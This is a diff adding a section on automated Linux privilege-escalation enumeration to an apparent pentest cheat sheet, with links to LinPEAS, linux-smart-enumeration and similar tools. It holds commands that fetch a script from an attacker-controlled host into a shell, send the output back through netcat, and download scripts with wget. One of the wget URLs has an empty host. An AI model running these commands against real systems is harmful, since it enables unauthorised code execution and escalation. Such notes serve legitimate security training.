@@ -7624,6 +7624,42 @@ os.setuid(0)
 os.system("bash")
 ```
 
+##### Automated Enumeration
+
+unix-privesc-check
+
+```c
+ ./unix-privesc-check > output.txt
+```
+
+LinPeas
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+
+Without curl
+
+```c
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+```
+
+Excute from memory and send output back to the host
+
+```c
+nc -lvnp 9002 | tee linpeas.out #Host
+curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
+```
+
+linux-smart-enumeration
+https://github.com/diego-treitos/linux-smart-enumeration 
+
+```c
+wget "http://IP/lse.sh" -O lse.sh;chmod 700 lse.sh
+wget "http:///lse.sh" -O lse.sh;chmod 700 lse.sh
+```
+
+LinEnum
+https://github.com/rebootuser/LinEnum
+
 ##### Library hijacking
 
 Observe the $PATH
